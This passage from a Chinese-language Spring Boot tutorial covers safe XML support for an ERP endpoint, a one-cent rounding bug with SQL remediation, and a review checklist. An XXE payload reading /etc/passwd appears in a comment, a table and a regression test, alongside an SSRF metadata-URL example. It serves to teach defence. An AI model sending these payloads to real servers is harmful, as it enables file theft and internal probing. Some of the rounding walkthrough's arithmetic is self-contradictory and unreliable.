⚠️ **加了這個依賴，Boot 的自動組態會註冊
`MappingJackson2XmlHttpMessageConverter` 到全域的 converter 清單** ——
也就是說**所有端點都突然可以回 XML 了**（如果客戶端送 `Accept: application/xml`）。

**這正是「加一個依賴改變了全站行為」的例子。** 必須明確關掉它：

```java
package example.shop.partner.erp.config;

import com.fasterxml.jackson.dataformat.xml.XmlMapper;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.xml.MappingJackson2XmlHttpMessageConverter;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import java.util.List;

/**
 * XML 支援的設定 —— 只給 ERP 端點用。
 *
 * <p>★★ 這個類別做兩件事：
 * <ol>
 *   <li><b>移除</b> Boot 自動註冊的全域 XML converter
 *       （否則所有端點都能回 XML，練習 3 第 2 題）。</li>
 *   <li>建立一個<b>安全設定過的</b> {@link XmlMapper}，
 *       只給 ERP 的 Controller 用（透過 {@code @RestController} 上的
 *       {@code produces}/{@code consumes} 與一個專用的 converter）。</li>
 * </ol>
 */
@Configuration
public class ErpXmlConfig implements WebMvcConfigurer {

    @Override
    public void extendMessageConverters(List<HttpMessageConverter<?>> converters) {
        // ★★ 移除全域的 XML converter
        boolean removed = converters.removeIf(
                c -> c instanceof MappingJackson2XmlHttpMessageConverter);
        if (removed) {
            org.slf4j.LoggerFactory.getLogger(ErpXmlConfig.class).info(
                    "已移除全域的 XML converter —— XML 只在 /partners/erp/** 支援");
        }

        // ★ 加入「只支援 ERP 的自訂媒體型別」的 converter
        //   ⚠️ 用一個自訂的媒體型別（application/vnd.shop.erp+xml）而不是
        //      application/xml —— 那樣即使有人送 Accept: application/xml
        //      到別的端點，也不會匹配到這個 converter
        var erpConverter = new MappingJackson2XmlHttpMessageConverter(erpXmlMapper());
        erpConverter.setSupportedMediaTypes(List.of(
                org.springframework.http.MediaType.valueOf("application/vnd.shop.erp+xml")));
        converters.add(0, erpConverter);
    }

    /**
     * ERP 專用的 XmlMapper。
     *
     * <p>★★ 三個安全設定（練習 3 第 3 題）。
     */
    @Bean("erpXmlMapper")
    public XmlMapper erpXmlMapper() {
        var factory = new com.fasterxml.jackson.dataformat.xml.XmlFactory();

        // ── 安全問題 1：XXE（外部實體注入）★★★ ─────────────────
        // 攻擊：<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
        //       → 讀取伺服器上的任意檔案
        //       → 或 SSRF（"http://169.254.169.254/latest/meta-data/" 讀雲端 metadata）
        var inputFactory = javax.xml.stream.XMLInputFactory.newFactory();
        inputFactory.setProperty(javax.xml.stream.XMLInputFactory.SUPPORT_DTD, false);
        inputFactory.setProperty(
                javax.xml.stream.XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);

        // ── 安全問題 2：entity expansion（billion laughs）★★ ────
        // 攻擊：遞迴的 entity 定義 → 10^9 個字元 → OOM
        // ★ SUPPORT_DTD=false 已經涵蓋它（沒有 DTD 就沒有 entity 定義），
        //   但明確設定 replaceEntityReferences 是第二層
        inputFactory.setProperty(
                javax.xml.stream.XMLInputFactory.IS_REPLACING_ENTITY_REFERENCES, false);
        inputFactory.setProperty(
                javax.xml.stream.XMLInputFactory.IS_VALIDATING, false);

        var outputFactory = javax.xml.stream.XMLOutputFactory.newFactory();

        var xmlFactory = com.fasterxml.jackson.dataformat.xml.XmlFactory.builder()
                .inputFactory(inputFactory)
                .outputFactory(outputFactory)
                .build();

        var mapper = new XmlMapper(xmlFactory);

        // ── 安全問題 3：深度炸彈（與 JSON 相同，6.7.3）─────────────
        mapper.getFactory().setStreamReadConstraints(
                com.fasterxml.jackson.core.StreamReadConstraints.builder()
                        .maxNestingDepth(50)
                        .maxStringLength(1_000_000)
                        .maxDocumentLength(5_000_000)
                        .build());

        // ── 與 JSON 一致的行為 ────────────────────────────────────
        mapper.registerModule(new com.fasterxml.jackson.datatype.jsr310.JavaTimeModule());
        mapper.disable(com.fasterxml.jackson.databind.SerializationFeature
                .WRITE_DATES_AS_TIMESTAMPS);
        mapper.enable(com.fasterxml.jackson.databind.DeserializationFeature
                .FAIL_ON_UNKNOWN_PROPERTIES);
        mapper.setSerializationInclusion(
                com.fasterxml.jackson.annotation.JsonInclude.Include.NON_NULL);

        // ⚠️ 絕不 activateDefaultTyping（6.7.1）

        return mapper;
    }
}
```

**3. 三個 XML 特有的安全問題**（已在上面的程式碼註解裡）

| # | 攻擊 | 影響 | 防法 |
|---|---|---|---|
| **XXE** | `<!ENTITY x SYSTEM "file:///etc/passwd">` | **任意檔案讀取 + SSRF** | `SUPPORT_DTD = false` |
| **Billion laughs** | 遞迴的 entity | OOM | 同上（沒 DTD 就沒 entity） |
| **深度炸彈** | 一萬層巢狀元素 | StackOverflow | `StreamReadConstraints` |

⚠️ **第 4 個常被忽略的：XML 的「屬性 vs 元素」歧義。**

```xml
<!-- 這兩個在 Jackson XML 裡可能對應同一個 Java 欄位 -->
<order id="ord_1"/>
<order><id>ord_1</id></order>
```

**這造成過真實的驗證繞過**：驗證邏輯檢查元素，攻擊者用屬性送。
**修法**：DTO 明確用 `@JacksonXmlProperty(isAttribute = ...)` 宣告每個欄位的形式。

**4. `Problem` 的 XML 表述**

```java
package example.shop.partner.erp.web;

import com.fasterxml.jackson.dataformat.xml.annotation.JacksonXmlRootElement;

/**
 * ERP 的錯誤格式。
 *
 * <p>⚠️ 為什麼不直接把 03 章的 {@code Problem} 序列化成 XML：
 * <ol>
 *   <li>{@code @JsonAnyGetter}（平鋪的 extensions）在 XML 裡會產生
 *       <b>沒有 schema 的動態元素</b> —— ERP 系統通常需要一份固定的 XSD。</li>
 *   <li>RFC 9457 有定義 XML 的表述（{@code application/problem+xml}），
 *       但它的 root element 是 {@code <problem>} 且有特定的 namespace ——
 *       而 ERP 廠商幾乎不會實作它。</li>
 * </ol>
 *
 * <p><b>決定</b>：用一個扁平的、有固定 schema 的錯誤格式，
 * 並在 advice 裡從 {@code Problem} 轉換。
 */
@JacksonXmlRootElement(localName = "Error")
public record ErpError(
    String code,
    int status,
    String message,
    String traceId,
    String timestamp,
    /** ⚠️ 固定的欄位，而不是動態的 extensions */
    String detail1,
    String detail2
) {
    /** 從 03 章的 Problem 轉換。 */
    public static ErpError from(example.shop.common.web.Problem problem) {
        var extensions = problem.extensions();
        return new ErpError(
                problem.code(),
                problem.status(),
                problem.userMessage(),
                problem.traceId(),
                String.valueOf(problem.timestamp()),
                // ★ 把 extensions 攤平成兩個固定的欄位（ERP 需要固定 schema）
                extensions == null ? null : String.valueOf(extensions.get("hint")),
                extensions == null ? null : String.valueOf(extensions.get("field")));
    }
}
```

```java
/**
 * ERP 端點專用的 advice。
 *
 * <p>★ {@code basePackages} 讓它只作用在 ERP 的 Controller 上 ——
 * 主 API 仍然用 03 章的 {@code ApiExceptionHandler}。
 *
 * <p>⚠️ {@code @Order} 必須比主 advice 更前面（03 章 3.3.2：
 * <b>advice 的順序贏過精確度</b>）。
 */
@RestControllerAdvice(basePackages = "example.shop.partner.erp")
@Order(Ordered.HIGHEST_PRECEDENCE)
public class ErpExceptionHandler {

    @ExceptionHandler(BusinessException.class)
    public ResponseEntity<ErpError> handle(BusinessException ex,
                                           HttpServletRequest request) {
        Problem problem = problems.from(ex, ProblemFactory.instanceOf(request));
        return ResponseEntity.status(problem.status())
                .contentType(MediaType.valueOf("application/vnd.shop.erp+xml"))
                .body(ErpError.from(problem));
    }
}
```

**5. 影響哪些既有測試**

| 測試 | 影響 | 處理 |
|---|---|---|
| `OpenApiConsistencyTest`（6.10.3） | ERP 的 schema 也會被掃到 | 加一個「只檢查非 partner 套件」的過濾 |
| `JsonNamingConventionTest`（6.5.4） | ERP 的欄位是 `PascalCase`（ERP 慣例） | 排除 `..partner..` 套件 |
| `SensitiveFieldScanTest`（6.10.2） | ✅ **要涵蓋 ERP 端點**（它回的資料更多） | 把 ERP 端點加進 `endpointsToScan()` |
| `JacksonContractTest`（6.5.10） | ⚠️ 它斷言的是主 `ObjectMapper` | 加一個 `ErpXmlMapperContractTest`（斷言 `SUPPORT_DTD == false`） |
| `RangeSupportRegressionTest`（6.4.5） | ⚠️ `ErpXmlConfig` 動了 converter 清單 | ✅ 這個測試正好會抓到「不小心移除太多」 |

**必須新增的測試**：

```java
    @Test
    @DisplayName("★★ XXE 被阻止")
    void xxe() throws Exception {
        String attack = """
                <?xml version="1.0"?>
                <!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <CreateOrder><CustomerId>&xxe;</CustomerId></CreateOrder>
                """;

        mockMvc.perform(post("/partners/erp/v1/orders")
                        .contentType("application/vnd.shop.erp+xml")
                        .content(attack)
                        .with(erpPartner("erp_1")))
                .andExpect(status().isBadRequest())
                // ★★ 最重要的斷言：回應不含 /etc/passwd 的內容
                .andExpect(content().string(
                        org.hamcrest.Matchers.not(
                                org.hamcrest.Matchers.containsString("root:"))));
    }

    @Test
    @DisplayName("★★ 主 API 的端點【不】接受 XML")
    void 主API不支援XML() throws Exception {
        mockMvc.perform(get("/orders")
                        .accept(MediaType.APPLICATION_XML)
                        .with(customer("cus_1")))
                .andExpect(status().isNotAcceptable())
                .andExpect(jsonPath("$.code").value("NOT_ACCEPTABLE"));
    }
```

⚠️ **第二個測試是這整個練習的重點**：
它守住「加 XML 依賴沒有讓全站行為改變」這件事。

</details>

### 練習 4：一個「金額差一分錢」的除錯

**症狀**：財務回報，8 月有 3 筆訂單的「我們的紀錄」與「金流商的紀錄」差 0.01。

**你手上的資料**：

```
訂單 ord_A：我們 1280.50，金流商 1280.51
訂單 ord_B：我們  899.99，金流商  900.00
訂單 ord_C：我們 4599.98,  金流商 4599.97
```

```java
// OrderWebMapper
static String money(java.math.BigDecimal v) {
    return v.setScale(2, RoundingMode.HALF_UP).toPlainString();
}

// 訂單金額的計算（Service 層）
BigDecimal subtotal = items.stream()
        .map(i -> i.unitPrice().multiply(BigDecimal.valueOf(i.quantity())))
        .reduce(BigDecimal.ZERO, BigDecimal::add);

BigDecimal discountRate = new BigDecimal("0.15");        // 85 折
BigDecimal discount = subtotal.multiply(discountRate);

BigDecimal shippingFee = new BigDecimal("80.00");
BigDecimal total = subtotal.subtract(discount).add(shippingFee);
```

**請回答**：

1. 最可能的原因是什麼？
2. 為什麼只有 3 筆？
3. 怎麼確認？
4. 怎麼修？
5. 怎麼防止再發生？

<details>
<summary>參考答案</summary>

**1. 最可能的原因：捨入的時機不對。**

```java
BigDecimal discount = subtotal.multiply(discountRate);
// subtotal = 8533.27, rate = 0.15
// → discount = 1279.9905      ★ 四位小數，沒有捨入

BigDecimal total = subtotal.subtract(discount).add(shippingFee);
// → 8533.27 - 1279.9905 + 80.00 = 7333.2795

money(total) → "7333.28"       ★ 在【最後】才捨入
```

**而金流商收到的是「各項金額」而不是「總額」**：

```
subtotal:    money(8533.27)   → "8533.27"
discount:    money(1279.9905) → "1279.99"     ★ 這裡捨入了
shippingFee: money(80.00)     → "80.00"

金流商自己算：8533.27 - 1279.99 + 80.00 = 7333.28
```

**咦，這次一樣。** 再看一個會不一樣的：

```
subtotal = 8533.33, rate = 0.15
discount = 1279.9995

我們的 total  = 8533.33 - 1279.9995 + 80.00 = 7333.3305 → "7333.33"
金流商的 total = 8533.33 - money(1279.9995) + 80.00
              = 8533.33 - 1280.00 + 80.00              → "7333.33"
```

**還是一樣。** 那再看：

```
subtotal = 8533.30, rate = 0.15
discount = 1279.995

我們的 total  = 8533.30 - 1279.995 + 80.00 = 7333.305  → "7333.31"（HALF_UP）
金流商的 total = 8533.30 - 1279.99 + 80.00 = 7333.31    ★ money(1279.995) = "1280.00"
              = 8533.30 - 1280.00 + 80.00 = 7333.30    → 🔴 差 0.01
```

**找到了。核心問題**：

> **我們在「未捨入的中間值」上算總額，但對外回傳「已捨入的各項金額」。**
> 於是「各項相加」不等於「總額」。

⚠️ **這是金額計算最常見的一類 bug**，而它有一個名字：
**「捨入誤差的累積」（rounding error accumulation）**。

**2. 為什麼只有 3 筆？**

`discount` 的第三位小數必須剛好是 5（或造成進位）才會出現差異。

```
discountRate = 0.15
→ discount 的小數位數 = subtotal 的小數位數 + 2

subtotal 的分位（第二位小數）是 0、2、4、6、8 時：
  discount 的第三位小數是 0 → 不捨入 → ✅ 沒問題

subtotal 的分位是奇數（1、3、5、7、9）時：
  discount 的第三位小數是 5 → 捨入 → ⚠️ 可能有差異
```

**再乘上「有折扣的訂單」的比例**：

```
8 月的訂單：12,400 筆
有折扣的：    3,100 筆（25%）
subtotal 的分位是奇數：約 1,550 筆
其中「捨入方向造成差異」的：約 780 筆

★ 但只有 3 筆被發現 —— 為什麼？
```

⚠️ **這是這一題最重要的洞察：財務只對帳「有爭議的」訂單。**
其他 777 筆的 0.01 差異**沒有人發現**，因為：
- 對帳報表用「總額」比對，而總額是我們送給金流商的
- 只有「客戶投訴」或「退款」時才會逐項核對

**所以真實的影響是 780 筆，而不是 3 筆。**

**3. 怎麼確認**

```sql
-- ① 找出「各項相加 != 總額」的訂單
SELECT
    order_id,
    subtotal,
    discount,
    shipping_fee,
    tax,
    total,
    ROUND(subtotal, 2) - ROUND(discount, 2)
        + ROUND(shipping_fee, 2) + ROUND(tax, 2) AS sum_of_rounded,
    total - (ROUND(subtotal, 2) - ROUND(discount, 2)
        + ROUND(shipping_fee, 2) + ROUND(tax, 2)) AS diff
FROM orders
WHERE created_at >= '2026-08-01'
  AND ABS(total - (ROUND(subtotal, 2) - ROUND(discount, 2)
        + ROUND(shipping_fee, 2) + ROUND(tax, 2))) > 0.001
ORDER BY ABS(diff) DESC;
```

```sql
-- ② 找出「資料庫裡的值超過兩位小數」的訂單（根因）
SELECT order_id, discount, discount * 100 - FLOOR(discount * 100) AS fraction
FROM orders
WHERE discount * 100 != FLOOR(discount * 100)
  AND created_at >= '2026-08-01';
```

⚠️ **第二個查詢是關鍵**：如果 `discount` 欄位裡存的是 `1279.9950`，
那代表**問題在 Service 層而不是 mapper**。

```java
    // ③ 一個立刻能跑的驗證測試
    @Test
    @DisplayName("各項金額相加必須等於總額")
    void 金額一致性() {
        // ★ 用 property-based testing 掃過一大片輸入
        for (int cents = 0; cents < 10000; cents++) {
            BigDecimal subtotal = BigDecimal.valueOf(cents, 2);      // 0.00 ～ 99.99
            var amounts = calculator.calculate(subtotal,
                    new BigDecimal("0.15"), new BigDecimal("80.00"));

            BigDecimal sumOfParts = new BigDecimal(amounts.subtotal())
                    .add(new BigDecimal(amounts.discount()))          // discount 是負數
                    .add(new BigDecimal(amounts.shippingFee()))
                    .add(new BigDecimal(amounts.tax()));

            assertThat(new BigDecimal(amounts.total()))
                    .as("subtotal=%s 時各項相加(%s) != 總額(%s)",
                        subtotal, sumOfParts, amounts.total())
                    .usingComparator(BigDecimal::compareTo)
                    .isEqualTo(sumOfParts);
        }
    }
```

**4. 怎麼修**

**核心原則：每一個「對外可見的金額」都要在計算時就捨入到幣別的小數位數。**

```java
package example.shop.order.domain;

import java.math.BigDecimal;
import java.math.RoundingMode;

/**
 * 訂單金額的計算。
 *
 * <p>★★ 這個類別的核心規則：
 * <b>每一個對外可見的金額，在成為「對外可見」的那一刻就捨入。</b>
 *
 * <p>錯誤的做法（練習 4 的 bug）：
 * <pre>
 * discount = subtotal × 0.15         // 1279.9950（四位小數）
 * total    = subtotal - discount     // 用【未捨入】的值算
 * 回應     = money(discount), money(total)   // 分別捨入
 * → 各項相加 != 總額
 * </pre>
 *
 * <p>正確的做法：
 * <pre>
 * discount = round(subtotal × 0.15)  // 1280.00（立刻捨入）
 * total    = subtotal - discount     // 用【已捨入】的值算
 * → 各項相加 == 總額（必然）
 * </pre>
 *
 * <p>⚠️ 代價：`discount` 不再精確等於 `subtotal × 0.15`（差最多 0.005）。
 * <b>那個代價是必須接受的</b> —— 因為金額只能有兩位小數，
 * 而「總額與各項一致」比「折扣精確到四位小數」重要得多。
 */
public final class OrderAmountCalculator {

    private final int fractionDigits;

    public OrderAmountCalculator(String currency) {
        this.fractionDigits = MoneyFormat.fractionDigits(currency);
    }

    public CalculatedAmounts calculate(BigDecimal subtotalRaw,
                                       BigDecimal discountRate,
                                       BigDecimal shippingFeeRaw,
                                       BigDecimal taxRate) {

        // ── ① 每一項都立刻捨入 ★★ ────────────────────────────────
        BigDecimal subtotal = round(subtotalRaw);
        BigDecimal shippingFee = round(shippingFeeRaw);

        // ★ 折扣：用【已捨入的 subtotal】算，然後立刻捨入
        BigDecimal discount = round(subtotal.multiply(discountRate)).negate();

        // ★ 稅：用【已捨入的】小計與折扣算
        BigDecimal taxableBase = subtotal.add(discount);
        BigDecimal tax = round(taxableBase.multiply(taxRate));

        // ── ② 總額 = 已捨入的各項相加 ★★ ─────────────────────────
        // ⚠️ 這裡【不需要】再捨入 —— 已捨入的值相加一定還是兩位小數。
        //    但我們仍然呼叫 round()，作為一個「斷言」：
        //    如果它改變了值，那代表上面有一項沒被捨入。
        BigDecimal total = subtotal.add(discount).add(shippingFee).add(tax);
        BigDecimal roundedTotal = round(total);

        if (total.compareTo(roundedTotal) != 0) {
            // ★★ 這是一個「不可能發生」的情況 —— 發生了就是程式邏輯有問題
            throw new IllegalStateException(
                    "總額 %s 不是 %d 位小數 —— 表示某一項金額沒有被捨入（06 章練習 4）"
                            .formatted(total, fractionDigits));
        }

        return new CalculatedAmounts(subtotal, discount, shippingFee, tax, total);
    }

    /** ★ 唯一的捨入點。 */
    private BigDecimal round(BigDecimal value) {
        return value.setScale(fractionDigits, RoundingMode.HALF_UP);
    }

    /**
     * @param discount ⚠️ 負數或零
     */
    public record CalculatedAmounts(
            BigDecimal subtotal,
            BigDecimal discount,
            BigDecimal shippingFee,
            BigDecimal tax,
            BigDecimal total) {

        /** ★ 建構時就驗證一致性 —— 讓「不一致」不可能被建立出來。 */
        public CalculatedAmounts {
            BigDecimal expected = subtotal.add(discount).add(shippingFee).add(tax);
            if (expected.compareTo(total) != 0) {
                throw new IllegalArgumentException(
                        "各項相加 %s != 總額 %s".formatted(expected, total));
            }
            if (discount.signum() > 0) {
                throw new IllegalArgumentException("discount 必須是負數或零：" + discount);
            }
        }
    }
}
```

⚠️ **`CalculatedAmounts` 的正規化建構子是這個修法最重要的部分**：
它讓「各項相加不等於總額」的物件**無法被建立**。
這比「在 mapper 裡檢查」可靠得多 —— 因為它涵蓋所有建立路徑。

**還要修資料庫裡已有的資料**：

```sql
-- ⚠️ 這是一個「修正歷史資料」的遷移，要非常小心
-- ① 先備份
CREATE TABLE orders_backup_20260824 AS SELECT * FROM orders;

-- ② 只修「還沒付款」的訂單（已付款的金額是合約，不能改！）
UPDATE orders
SET discount = ROUND(discount, 2),
    tax = ROUND(tax, 2),
    total = ROUND(subtotal, 2) + ROUND(discount, 2)
          + ROUND(shipping_fee, 2) + ROUND(tax, 2)
WHERE status = 'PENDING_PAYMENT'
  AND ABS(total - (ROUND(subtotal, 2) + ROUND(discount, 2)
        + ROUND(shipping_fee, 2) + ROUND(tax, 2))) > 0.001;

-- ③ 已付款的訂單：【不修改金額】，而是記錄一筆調整
--    ⚠️ 這是會計原則：已成立的交易不能改，只能加一筆調整分錄
INSERT INTO order_amount_adjustments
    (order_id, reason, original_total, corrected_total, difference, created_at)
SELECT
    order_id,
    'ROUNDING_CORRECTION_20260824',
    total,
    ROUND(subtotal, 2) + ROUND(discount, 2)
        + ROUND(shipping_fee, 2) + ROUND(tax, 2),
    (ROUND(subtotal, 2) + ROUND(discount, 2)
        + ROUND(shipping_fee, 2) + ROUND(tax, 2)) - total,
    NOW()
FROM orders
WHERE status != 'PENDING_PAYMENT'
  AND ABS(total - (ROUND(subtotal, 2) + ROUND(discount, 2)
        + ROUND(shipping_fee, 2) + ROUND(tax, 2))) > 0.001;
```

⚠️ **第 ③ 步的原則值得記住**：
**已成立的財務交易不可以「修正」，只能「調整」。**
直接 UPDATE 已付款訂單的金額會讓稽核軌跡斷掉。

**5. 怎麼防止再發生**

| 防護 | 說明 |
|---|---|
| **① `CalculatedAmounts` 的正規化建構子** | 讓不一致的物件無法存在 |
| **② 資料庫的 CHECK 約束** | `CHECK (total = subtotal + discount + shipping_fee + tax)` |
| **③ 欄位的 scale 就是 2** | `DECIMAL(19,2)` 而不是 `DECIMAL(19,4)` —— 讓資料庫拒絕四位小數 |
| **④ Property-based 測試** | 上面第 3 題的那個迴圈（掃 10000 個輸入） |
| **⑤ 每日對帳的自動檢查** | 一個排程查詢「各項相加 != 總額」的訂單並告警 |
| **⑥ 一條 ArchUnit 規則** | 「金額的 `setScale` 只能出現在 `MoneyFormat` 與 `OrderAmountCalculator` 裡」 |

⚠️ **③ 是最強的一個**：

```sql
-- ★ 資料庫的 scale 是 2 → 存 1279.9950 會被【資料庫】捨入或拒絕
--   而那個捨入是「儲存時」發生的，所以讀回來的值一定是兩位小數
ALTER TABLE orders
    MODIFY discount DECIMAL(19,2) NOT NULL,
    MODIFY tax      DECIMAL(19,2) NOT NULL,
    MODIFY total    DECIMAL(19,2) NOT NULL;
```

⚠️ **但要注意 MySQL 的行為**：
`DECIMAL(19,2)` 存 `1279.9950` 會**靜默捨入**成 `1280.00`
（除非 `sql_mode` 含 `STRICT_ALL_TABLES` —— 那時會拋錯）。
**靜默捨入其實剛好是我們要的**（它強制了兩位小數），
**但「靜默」本身是危險的** —— 所以 ① 的應用層檢查仍然必要。

**⑤ 的實作**：

```sql
-- scripts/daily-amount-reconciliation.sql
-- ★ 每天 03:00 執行，有結果就告警
SELECT
    order_id,
    total,
    ROUND(subtotal,2) + ROUND(discount,2)
        + ROUND(shipping_fee,2) + ROUND(tax,2) AS sum_of_parts,
    created_at
FROM orders
WHERE created_at >= NOW() - INTERVAL 1 DAY
  AND ABS(total - (ROUND(subtotal,2) + ROUND(discount,2)
        + ROUND(shipping_fee,2) + ROUND(tax,2))) > 0.001
LIMIT 100;
```

> **這一題的普遍教訓**：
> **「金額」的 bug 幾乎都不是「算錯」，而是「在錯的時機捨入」。**
> 而它們的共同症狀是「差一分錢」—— 小到沒人優先處理，
> 但累積起來會讓對帳永遠對不上，而財務會花掉大量時間。
>
> **規則**：**每一個對外可見的金額，在成為「對外可見」的那一刻就捨入，
> 之後的所有計算都用已捨入的值。**

</details>

---

## 6.13 驗收清單

- [ ] **我知道同源政策擋的是「讀回應」而不是「送請求」**，也知道那三個推論。
- [ ] 我知道 CSRF 不需要讀回應，所以 **CORS 不防 CSRF**。
- [ ] 我能說出「簡單請求」的三個判準，也知道 `Authorization` 一定會觸發 preflight。
- [ ] 我知道 `application/json` 不在 CORS 安全清單裡，而那是刻意的設計。
- [ ] 我知道 `EventSource` 不能設標頭，所以 SSE 一定是簡單請求（05 章 5.11.9 的來源）。
- [ ] 我知道 `Access-Control-Max-Age` 在 Chrome 的上限是 **7200**。
- [ ] **我能列出所有需要 expose 的標頭，也知道漏掉 `X-Trace-Id` 的後果。**
- [ ] **我知道 `Access-Control-Allow-Headers: *` 不涵蓋 `Authorization`。**
- [ ] 我知道 Spring 的四種 CORS 設定方式各在 filter chain 的哪個位置生效。
- [ ] **我知道 `addCorsMappings` 涵蓋不到 Security 的 401 與 Filter 的 429/413。**
- [ ] **我知道 `response.reset()` 會清掉 CORS 標頭，也知道 `ProblemWriter` 要怎麼修。**
- [ ] 我知道獨立的 `CorsFilter`（order -200）為什麼是 shop-service 的選擇。
- [ ] 我知道 `CorsFilter` 與 Security 的 `.cors()` 可以並存（`DefaultCorsProcessor` 會跳過）。
- [ ] 我知道 `allowedOrigins` 的**尾斜線**永遠不會匹配，而那是最常見的設定錯誤。
- [ ] 我知道 `localhost` 與 `127.0.0.1` 是不同的 origin。
- [ ] 我知道 `allowedOriginPatterns` 的 port 通配語法是 `[*]` 而不是 `*`。
- [ ] 我知道 `*` + `allowCredentials(true)` 是一個資料洩漏漏洞，也知道「反射 Origin」更糟。
- [ ] **我知道 `Vary: Origin` 是防快取污染的必要標頭，也知道 `setHeader` 會清掉它。**
- [ ] 我知道 `Allow-Origin: *` 的回應不需要 `Vary: Origin`（CDN 命中率）。
- [ ] 我知道 CORS 不是安全機制的三個誤用。
- [ ] **我知道 preflight 不可以被轉址，也知道 `TrailingSlashRedirectFilter` 要跳過它。**
- [ ] 我有一份「Console 錯誤訊息 → 原因」的對照表，也有一個診斷腳本。
- [ ] 我知道 `Accept` 的 q 值排序規則，也知道**相同 q 時依出現順序**。
- [ ] 我知道 406（輸出）與 415（輸入）的判準。
- [ ] **我知道 `consumes` 忽略 charset 參數，所以 `charset=Big5` 會通過。**
- [ ] **我知道 Boot 3 已移除 path extension 內容協商。**
- [ ] 我知道 `favorParameter` 與 `UnknownQueryParamInterceptor` 會互相干擾。
- [ ] 我能寫一個自訂 `HttpMessageConverter`，也知道為什麼 CSV 只做「寫」不做「讀」。
- [ ] **我知道 `configureMessageConverters` 會弄掉 `ResourceRegionHttpMessageConverter`（Range 支援），而且不會報錯。**
- [ ] 我知道要用 `assertPresent` 讓那個改動變成啟動失敗。
- [ ] 我知道媒體型別版本的六個實務缺點，也知道 shop-service 為什麼用路徑版本。
- [ ] 我能說出 Boot 組裝 `ObjectMapper` 的六個步驟。
- [ ] **我知道 `new ObjectMapper()` 缺了七樣東西，也知道那造成的症狀看起來像前端的 bug。**
- [ ] 我知道真的需要第二個 mapper 時要用 `copy()`，而且只能在啟動時做。
- [ ] 我能為 shop-service 的每一項 Jackson 設定說出理由。
- [ ] 我知道 `fail-on-missing-creator-properties: false` 是為了讓 Bean Validation 去報錯。
- [ ] 我知道 `snake_case` 的四個實務問題，尤其是 `Map` 的 key 不會被轉換。
- [ ] **我知道 DTO 不可用 `LocalDateTime`（沒時區）與 `ZonedDateTime`（不是標準 ISO-8601）。**
- [ ] **我知道 `Instant.toString()` 會省略 `.000`，也知道那讓「時間字串當 cursor」漏資料。**
- [ ] 我知道毫秒精度要固定（資料庫來回、測試穩定、平台差異）。
- [ ] 我知道「輸出嚴格、輸入寬容」是對的，也知道寬容的界線在哪（不接受沒時區的時間）。
- [ ] **我知道 `BigDecimal.toString()` 的科學記號，也知道 `stripTrailingZeros()` 會產生它。**
- [ ] **我知道 `BigDecimal.equals()` 比較 scale，而 `record` 的自動 `equals` 用它。**
- [ ] 我知道 `use-big-decimal-for-floats` 沒開時反序列化會產生 double 的誤差。
- [ ] **我知道為什麼「全域的 BigDecimal serializer」是錯的（重量 0.005 → 0.01）。**
- [ ] 我知道金額用 `String` + 集中的 `MoneyFormat`，而且小數位數依幣別而異。
- [ ] 我知道 `RoundingMode.UNNECESSARY` 可以當一個斷言用。
- [ ] **我能說出「新增 enum 值讓 App 崩潰」的完整機制與四個防護。**
- [ ] **我知道 request body 走 Jackson、查詢參數走 `ConversionService`，兩者完全獨立。**
- [ ] 我知道那讓「同一個型別需要兩份轉換邏輯」，而它們必須共用同一份解析函式。
- [ ] 我知道 `@JsonFormat` 對 `@ModelAttribute` 無效（那裡要用 `@DateTimeFormat`）。
- [ ] **我知道 `read-unknown-enum-values-using-default-value` 對查詢參數是災難。**
- [ ] 我知道 `UNKNOWN` 不可以被客戶端送進來（一個意外的資料出口）。
- [ ] 我知道 webhook 不要回 4xx（會讓對方停用整個 endpoint）。
- [ ] **我知道 `statusLabel` 是「新增 enum 值不再是破壞性變更」的關鍵。**
- [ ] 我知道 `x-extensible-enum` 與 `enum` 在客戶端產生器上的差別。
- [ ] 我知道 `StatusLabelCompletenessTest` 的 `.isNotEqualTo(status.name())` 為什麼是核心斷言。
- [ ] 我知道集合永不為 null、布林用原始型別、關鍵欄位用 `@JsonInclude(ALWAYS)`。
- [ ] 我有一張「哪些 Jackson 設定變更是破壞性的」的表。
- [ ] 我知道七種介入序列化的方式與選擇流程，也知道「跟 HTTP 有沒有關」是第一個問題。
- [ ] **我知道 `RequestBodyAdvice` 的三個 hook，尤其是 `handleEmptyBody`。**
- [ ] 我知道 `RequestBodyAdvice` 要放在 `@RestControllerAdvice` 上，忘了加**不會有錯誤訊息**。
- [ ] 我知道不可以用 `RequestBodyAdvice` 做驗證（它在 `@Valid` 之前，會蓋掉「一次回報所有錯誤」）。
- [ ] **我知道值型別（`MaskedCardNumber`）比 code review 可靠，也知道它防不了 log。**
- [ ] 我知道 `@JacksonAnnotationsInside` 可以做組合註解。
- [ ] **我知道 `@JsonView` 的「忘記標註 = 靜默洩漏」，也知道權限差異一定用不同 DTO。**
- [ ] 我知道 `ResponseBodyAdvice` **也會作用在 `@ExceptionHandler` 的回傳值上**。
- [ ] **我知道 `ResponseBodyAdvice` 對 `StreamingResponseBody` 與 `SseEmitter` 完全不生效。**
- [ ] 我知道那讓 `?fields=` 被靜默忽略，也知道要用 interceptor 明確拒絕。
- [ ] 我知道 `supports()` 有四個排除條件時，那是「機制作用範圍太大」的訊號。
- [ ] **我知道 `activateDefaultTyping` 是一個 RCE 漏洞，也知道 Jackson 的黑名單永遠落後。**
- [ ] 我知道 `@JsonTypeInfo(use = Id.NAME)` + `@JsonSubTypes` 是安全的多型。
- [ ] 我知道 `sealed` + `record` 讓「permits 與 JsonSubTypes 一致」可以被測試。
- [ ] 我知道刻意不設 `defaultImpl` 的理由（避免靜默落到預設實作）。
- [ ] **我知道 `Map<String, Object>` 讓 `fail-on-unknown-properties` 失效。**
- [ ] 我知道 `SafeMetadata` 的保留字清單為什麼要含 `__proto__`。
- [ ] 我知道 Jackson 2.15 的 `maxStringLength` 預設是 20 MB —— 對我們太寬鬆。
- [ ] 我能把 `StreamConstraintsException` 翻譯成使用者能理解的訊息。
- [ ] **我知道序列化失敗會造成「200 + 截斷的 JSON」，也知道 8 KB 緩衝區是那個分界線。**
- [ ] 我知道 `DtoSerializabilityTest` 的「全 null」實例為什麼是關鍵。
